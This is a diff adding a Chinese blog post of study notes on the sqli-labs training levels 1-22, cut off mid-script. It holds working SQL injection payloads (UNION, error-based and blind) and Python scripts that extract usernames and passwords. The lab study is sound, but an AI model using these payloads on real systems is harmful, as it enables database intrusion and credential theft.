@@ -1,0 +1,1142 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/head.png">
+  <link rel="icon" type="image/png" href="/img/head.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="SE_NULL">
+  <meta name="keywords" content="">
+  <title>sql-labs记录1 - SE_Null</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>SE_Null</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-06-01 00:23" pubdate>
+        June 1, 2020 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      88
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">sql-labs记录1</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>本文记录一下sqli-labs第1-22关注入学习的过程。</p>
+<a id="more"></a>
+
+
+
+
+
+<h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h2><h3 id="1-information-schema"><a href="#1-information-schema" class="headerlink" title="1.information_schema"></a>1.information_schema</h3><p><img src="/2020/06/01/sql-labs%E8%AE%B0%E5%BD%951/image-20210216142604439.png" srcset="/img/loading.gif" alt="image-20210216142604439"></p>
+<p>information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。把mysql数据库看作一本书，则它相当于mysql数据库的目录。</p>
+<p>我们经常在注入时结合information_schema来爆数据库、表、字段等等。介绍几个常用的</p>
+<pre><code class="hljs mysql">information_schema.schemata	所有数据库名，show databases()的结果就是取自于此；
+schema_name	数据库名，schemata属性，跟show databases()显示出来的一样；
+information_schema.tables	所有表的信息
+table_name		表的名称，table属性
+table_schema	数据库名，table属性
+information_schema.columns	表示所有列的信息
+table_name		表的名称，columns属性
+column_name		列的名称，columns属性
+table_schema	数据库名，columns属性</code></pre>
+
+<p><strong>栗子</strong></p>
+<p>1.查询所有数据库：</p>
+<pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></pre>
+
+<p>2.查询数据表：</p>
+<pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;&quot;</code></pre>
+
+<p>3.查询字段：</p>
+<pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;&quot;</code></pre>
+
+<p>4.查询数据：</p>
+<pre><code class="hljs mysql">url?id&#x3D;-1 union select 1,group_concat(username,&quot; &quot;,password) from  table_name</code></pre>
+
+
+
+<h3 id="2-基础函数"><a href="#2-基础函数" class="headerlink" title="2.基础函数"></a>2.基础函数</h3><h4 id="1-系统函数"><a href="#1-系统函数" class="headerlink" title="1.系统函数"></a>1.系统函数</h4><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>——MySQL 版本
+<span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>——数据库用户名
+<span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>——数据库名
+@@datadir——数据库路径
+@@version_compile_os——操作系统版本</code></pre>
+
+<p>user()可能为以下情况</p>
+<pre><code class="hljs angelscript"><span class="hljs-symbol">root@</span>localhost:表本地  
+<span class="hljs-symbol">root@</span>%：表任意主机  
+<span class="hljs-symbol">root@</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>：表指定IP</code></pre>
+
+
+
+<h4 id="2-union"><a href="#2-union" class="headerlink" title="2.union"></a>2.union</h4><p>用于将不同表中相同列中查询的数据展示出来，不包括重复数据。但是UNION 内部的 SELECT 语句必须拥有相同数量的列，列也必须拥有相似的数据类型。同时每条 SELECT 语句中的 列的顺序必须相同。若要重复值也显示出来，则使用<code>UNION ALL</code></p>
+<h4 id="3-字符串连接函数"><a href="#3-字符串连接函数" class="headerlink" title="3.字符串连接函数"></a>3.字符串连接函数</h4><h5 id="1-concat-str1-str2-…"><a href="#1-concat-str1-str2-…" class="headerlink" title="1.concat(str1,str2,…)"></a>1.<strong>concat(str1,str2,…)</strong></h5><p>没有分隔符地连接字符串.返回结果为连接参数产生的字符串。</p>
+<pre><code class="hljs pgsql">如有任何一个参数为<span class="hljs-keyword">NULL</span> ，则返回值为 <span class="hljs-keyword">NULL</span>。如果所有参数均为非二进制字符串，则结果为非二进制字符串。 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串。若要避免一个数字参数被转化为与之相等的二进制字符串格式,可使用显式类型 <span class="hljs-keyword">cast</span>, 例如： `<span class="hljs-keyword">SELECT</span> CONCAT(CAST(int_col <span class="hljs-keyword">AS</span> <span class="hljs-type">CHAR</span>), char_col)`</code></pre>
+
+<p>另外虽然没有分隔符连接字符串，但还是试验时可以使用分隔符：<code>concat(id,&#39;|&#39;,pwd,&#39;|&#39;,repwd)</code>：|为分割符,可为任意分隔符。</p>
+<h5 id="2-concat-ws-‘separator’-str1-str2-…"><a href="#2-concat-ws-‘separator’-str1-str2-…" class="headerlink" title="2.concat_ws(‘separator’,str1,str2,…)"></a>2.<strong>concat_ws(‘separator’,str1,str2,…)</strong></h5><p>全称<code>CONCAT With Separator</code>,含有分隔符地连接字符串。</p>
+<pre><code class="hljs yaml"><span class="hljs-string">分隔符可以是一个字符串，也可以是其它参数。如果分隔符为</span> <span class="hljs-literal">NULL</span><span class="hljs-string">，则结果为</span> <span class="hljs-literal">NULL</span><span class="hljs-string">。函数会忽略任何分隔符参数后的</span> <span class="hljs-literal">NULL</span> <span class="hljs-string">值，不会忽略任何空字符串。</span></code></pre>
+
+
+
+<h5 id="3-group-concat"><a href="#3-group-concat" class="headerlink" title="3.group_concat()"></a>3.<strong>group_concat()</strong></h5><p>返回要连接的字段的一个集合</p>
+<p><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p>
+<p>当只有一个参数时，默认连接分隔符是”,“</p>
+<h4 id="4-用于盲注的函数"><a href="#4-用于盲注的函数" class="headerlink" title="4.用于盲注的函数"></a>4.用于盲注的函数</h4><p><strong>floor()</strong></p>
+<p>说明：向下取整。floor(1)=floor(1.2)=1</p>
+<p><strong>rand()</strong></p>
+<p>说明：在0和1之间产生一个随机数。rand(0)*2将取0到2的随机数，并不是执行两次随机数。rand不能和order by一起使用</p>
+<p><strong>if()</strong></p>
+<p>说明：<code>if(expr1,expr2,expr3)</code>含义是如果expr1是True,则返回expr2,否则返回expr3。多用于时间盲注。</p>
+<p><strong>length()</strong></p>
+<p>说明：返回字符串的长度</p>
+<p><strong>count()</strong></p>
+<p>说明：用来统计记录的数量。其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。</p>
+<p><strong>left(a,b)</strong></p>
+<p>说明：database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p>
+<p>举例：<code>left(database(),1)&gt;’s’ </code></p>
+<p><strong>Ascii()</strong></p>
+<p>说明：Ascii()将某个字符转换 为 ascii 值</p>
+<p><strong>substr(a,b,c)</strong></p>
+<p>说明：从 b 位置开始，截取字符串 a 的 c 长度。</p>
+<p>举例：</p>
+<pre><code class="hljs mysql">ascii(substr((select table_name information_schema.tables where tables_schema &#x3D;database()limit 0,1),1,1))&#x3D;101 --+</code></pre>
+
+<p><strong>mid(a,b,c)</strong></p>
+<p>说明：从位置 b 开始，截取 a 字符串的 c 位 </p>
+<p><strong>ord()</strong></p>
+<p>说明：Ord()函数同 ascii()，将字符转为 ascii 值</p>
+<p>举例：</p>
+<pre><code class="hljs mysql">ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</code></pre>
+
+<p><strong>sleep()</strong></p>
+<p>说明：<code>sleep(n)</code>将程序挂起n秒后执行。多用于时间盲注。</p>
+<p><strong>BENCHMARK()</strong></p>
+<p>说明：BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 <strong>sleep()</strong></p>
+<p>举例：</p>
+<pre><code class="hljs sql">UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">IF</span>(<span class="hljs-keyword">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-built_in">CHAR</span>(<span class="hljs-number">119</span>),<span class="hljs-keyword">BENCHMARK</span>(<span class="hljs-number">5000000</span>,<span class="hljs-keyword">ENCODE</span>(‘M SG’,’<span class="hljs-keyword">by</span> <span class="hljs-number">5</span> <span class="hljs-keyword">seconds</span>’)),<span class="hljs-literal">null</span>) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1;</code></pre>
+
+
+
+<h3 id="3-常见注入"><a href="#3-常见注入" class="headerlink" title="3.常见注入"></a>3.常见注入</h3><h4 id="1-十种报错注入"><a href="#1-十种报错注入" class="headerlink" title="1.十种报错注入"></a>1.十种报错注入</h4><p>sql语句错误时，web页面会报错，有的会输出后台数据库错误语句。</p>
+<h5 id="1-双查询注入报错-floor-报错"><a href="#1-双查询注入报错-floor-报错" class="headerlink" title="1.双查询注入报错-floor()报错"></a>1.双查询注入报错-floor()报错</h5><p>固定套路：</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat_ws</span>(<span class="hljs-string">&#x27;:&#x27;</span>,([子查询],<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>()*<span class="hljs-number">2</span>))) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">form</span> [table_name] <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;
+理论上每次都有百分之50的可能性成功报错
+可以替换为以下（不过没试验过。。）
+<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(), <span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))
+如果关键的表被禁用了，可以使用这种形式 
+<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-literal">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> !<span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">version</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))
+如果 <span class="hljs-keyword">rand</span> 被禁用了可以使用用户变量来报错
+<span class="hljs-keyword">select</span> <span class="hljs-keyword">min</span>(@a:=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">concat</span>(<span class="hljs-keyword">password</span>,@a:=(@a+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>)</code></pre>
+
+<p><strong>原理</strong>：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是<code>floor(random(0)*2)</code>的不确定性，即可能为0也可能为1,<code>group by floor(random(0)*2)</code>出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下<code>floor(random(0)*2)</code>可能为0，如果此时临时表只有key为1的行和不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时<code>floor(random(0)*2)</code>结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。正确结果与报错信息一起输出。</p>
+<p>关于key：<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。</p>
+<p>原理来自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/BloodZero/p/4660971.html">https://www.cnblogs.com/BloodZero/p/4660971.html</a></p>
+<h5 id="2-updatexml和extractvalue"><a href="#2-updatexml和extractvalue" class="headerlink" title="2.updatexml和extractvalue"></a>2.updatexml和extractvalue</h5><p><strong>updatexml</strong></p>
+<p>UPDATEXML (XML_document, XPath_string, new_value); </p>
+<pre><code class="hljs crmsh">第一个参数：XML_document是<span class="hljs-keyword">String</span>格式，为XML文档对象的名称，文中为Doc 
+第二个参数：XPath_string (<span class="hljs-keyword">Xpath</span>格式的字符串) ，如果不了解<span class="hljs-keyword">Xpath</span>语法，可以在网上查找教程。 
+第三个参数：new_value，<span class="hljs-keyword">String</span>格式，替换查找到的符合条件的数据</code></pre>
+
+<p>用法，最大长度限制32位</p>
+<pre><code class="hljs sql">and updatexml(1,concat(0x7e,(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre>
+
+<p>解释</p>
+<p>由于updatexml的第二个参数需要Xpath格式的字符串，以0x7e开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了。</p>
+<p><strong>extractvalue</strong></p>
+<p>updatexml是修改的。而evtractvalue是查询的。从目标XML中返回包含所查询值的字符串。</p>
+<p>EXTRACTVALUE (XML_document, XPath_string);</p>
+<pre><code class="hljs sql">　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
+　　第二个参数：XPath_string (Xpath格式的字符串)</code></pre>
+
+<p>用法：最大长度限制32位</p>
+<pre><code class="hljs sql">and extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> @@<span class="hljs-keyword">version</span>),<span class="hljs-number">0x7e</span>))</code></pre>
+
+<p>解释</p>
+<p>依旧如同updatexml一样，extract的第二个参数要求是xpath格式字符串，而我们输入的并不是。所以报错。</p>
+<h5 id="3-有关画图的七类"><a href="#3-有关画图的七类" class="headerlink" title="3.有关画图的七类"></a>3.有关画图的七类</h5><p>差不多都是和画图有关的，共同点是传入非正常参数导致报错和查询嵌套导致报错，所以我把它归为一类。</p>
+<p><strong>geometrycollection()</strong></p>
+<p>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p>
+<pre><code class="hljs sql">POINT(x,y) 函数,这是坐标函数，相当于X,Y坐标图上的一点。
+LINESTRING(x y,x y)函数,这个函数用来描述直线,两点连成的直线。</code></pre>
+
+<p>利用条件：5.5&lt;version()&lt;5.6</p>
+<p>用法</p>
+<pre><code class="hljs sql">and geometrycollection((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>解释</p>
+<p>由于MYSQL无法用这样字符串画出图形,所以报错了</p>
+<p><strong>multipoint()</strong></p>
+<p>　MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。</p>
+<p>用法</p>
+<pre><code class="hljs sql">and multipoint((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>MultiPoint（）函数中是需要数字的，没有就报错了。。。</p>
+<p><strong>polygon()</strong></p>
+<p>在地区地图上，Polygon对象可表示森林、区等。</p>
+<p>用法</p>
+<pre><code class="hljs sql">and polygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>解释：</p>
+<p>需要数字的，没有就报错了。。。</p>
+<p><strong>multipolygon()</strong></p>
+<p>　multipolygon()是一种由Polygon元素构成的几何对象集合。</p>
+<p>用法</p>
+<pre><code class="hljs n1ql">and multipolygon((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>解释：</p>
+<p>　multipolygon()需要的是Polygon元素。为了显错传入字符串,所以报错。</p>
+<p><strong>linestring()</strong></p>
+<p>LineString()是具有点之间线性内插特性的Curve.</p>
+<p>用法</p>
+<pre><code class="hljs sql">and linestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>解释：</p>
+<p>LineString(1 1,2 2) 这是它的用法。为了显错传入了,字符串….</p>
+<p><strong>multilinestring()</strong></p>
+<p>multilinestring()是一种由LineStirng元素构成的MultiCurve几何对象集合。</p>
+<p>用法</p>
+<pre><code class="hljs sql">and multilinestring((<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b));</code></pre>
+
+<p>解释：</p>
+<p>MULTILINESTRING((10 10, 20 20), (15 15, 30 15))这样用的。为了显错又把字符串传进去了。</p>
+<p><strong>exp()</strong></p>
+<p>EXP(x)函数计算e的x次方，即ex。</p>
+<p>用法</p>
+<pre><code class="hljs sql">and exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));</code></pre>
+
+<p>解释</p>
+<p>　EXP()肯定是需要数字的,传入个字符串必然显错</p>
+<h4 id="2-盲注"><a href="#2-盲注" class="headerlink" title="2.盲注"></a>2.盲注</h4><p>blind sql是注入攻击的一种，向数据库发送true或false的问题，并根据应用返回的信息判断结果。这种攻击的出现是因为应用程序只显示常规错误，但并没有解决sql注入存在的代码问题。</p>
+<p>进行常规sql注入时，web界面会返回后端数据库执行sql查询返回的错误信息，盲注与常规注入相似，但是不同的是数据库返回的数据的检索方式，若数据库没有输出数据到web页面，攻击者会询问一些列的true或false问题，强制从数据库获取数据。</p>
+<p>在有些情况下，后台使用了错误信息屏蔽方式(比如@)屏蔽了报错，此时无法根据报错信息来进行判断注入。</p>
+<p>从安全角度讲，后台数据库返回错误提示，这给构造闭合语句的人提供了便利，为了解决这一安全问题，除了在后台设置相应的语句判断机制外，不提供对应的错误返回提示，或无论在什么情况下都提供相同的错误返回提示确实是一种降低渗透风险的方法。而盲注就是在后台不提供返回提示的情况下构造payload的方法，其实它本身也还是一种注入方式。</p>
+<h5 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1.布尔盲注"></a>1.布尔盲注</h5><p>即基于真假的盲注。主要有以下几种表现情况</p>
+<p>1.<strong>没有报错信息</strong></p>
+<p>2.不管正确的输入，还是错误的输入，都只显示<strong>两种情况</strong>(我们可以默认为0和1)</p>
+<p>3.在正确的输入下，输入and1=1，and1=2发现可以判断返回结果信息</p>
+<p>常使用以下语句猜解字符串：</p>
+<pre><code class="hljs mysql">url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select length(database()) --+
+           
+url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select substr(database(),1,1) --+
+           
+url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] select ascii(substr(database(),1,1)) --+
+
+url?var&#x3D;1[&#39; | &quot; | ) | &#39;) | &quot;) ...] and ascii(substr(database(),1,1)) &gt; | &lt; | &#x3D; N --+</code></pre>
+
+<p>一般来说<strong>二分法脚本</strong>如下：(来源于<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/">Y4tacker</a>)</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="hljs-string">&#x27;) | &quot;) ...] and 1=&quot;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">result = &#x27;</span><span class="hljs-string">&#x27;</span>
+<span class="hljs-string">i = 0</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">while True:</span>
+<span class="hljs-string">    i = i + 1</span>
+<span class="hljs-string">    head = 32</span>
+<span class="hljs-string">    tail = 127</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    while head &lt; tail:</span>
+<span class="hljs-string">        mid = (head + tail) &gt;&gt; 1 #中值</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr(database(),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前数据库</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=database()),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前数据库所有的表</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">&quot;users&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆当前表的所有字段</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(username) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27;	#爆用户名</span>
+<span class="hljs-string">        # payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr((select group_concat(password) <span class="hljs-keyword">from</span> users),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+<span class="hljs-string">&#x27; #爆密码</span>
+<span class="hljs-string">        r = requests.get[ | POST ](url + payload, timeout=2)</span>
+<span class="hljs-string">        if &#x27;</span>屏幕回显<span class="hljs-string">&#x27; in r.text:</span>
+<span class="hljs-string">            head = mid + 1</span>
+<span class="hljs-string">        else:</span>
+<span class="hljs-string">            tail = mid</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    if head != 32:</span>
+<span class="hljs-string">        result += chr(head)</span>
+<span class="hljs-string">    else:</span>
+<span class="hljs-string">        break</span>
+<span class="hljs-string">print(result)</span></code></pre>
+
+<p><strong>有时候屏幕回显很大一部分不好掌握，建议使用时间盲注。</strong></p>
+<p>也可用burp进行爆破，但是步骤太多，太麻烦了。。</p>
+<h5 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.时间盲注"></a>2.时间盲注</h5><p>由于<strong>注入点无法反馈信息</strong>，所以不能像其他注入方式那样直接简洁的获取信息，需要从侧面一步步拼凑出信息。</p>
+<p> 常使用以下语句猜解字符串：</p>
+<pre><code class="hljs mysql">url?var&#x3D;1[&#39; | &quot; | ) | &#39;) | &quot;) ...] and if(1&#x3D;0,1, sleep(10)) --+ 
+          
+url?var&#x3D;-1[&#39; | &quot; | ) | &#39;) | &quot;) ...] union select if(SUBSTRING(current,1,1)&#x3D;CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1 --+</code></pre>
+
+<p>一般来说<strong>二分法脚本</strong>如下：</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;url?id=1[&#x27; | &quot;</span> | ) | <span class="hljs-string">&#x27;) | &quot;) ...] and 1=&quot;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">result = &#x27;</span><span class="hljs-string">&#x27;</span>
+<span class="hljs-string">i = 0</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">while True:</span>
+<span class="hljs-string">    i = i + 1</span>
+<span class="hljs-string">    head = 32</span>
+<span class="hljs-string">    tail = 127</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    while head &lt; tail:</span>
+<span class="hljs-string">        mid = (head + tail) &gt;&gt; 1 #中值</span>
+<span class="hljs-string">        payload = f&#x27;</span><span class="hljs-keyword">if</span>(ascii(substr(database(),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">3</span>))--+<span class="hljs-string">&#x27; #当前数据库名</span>
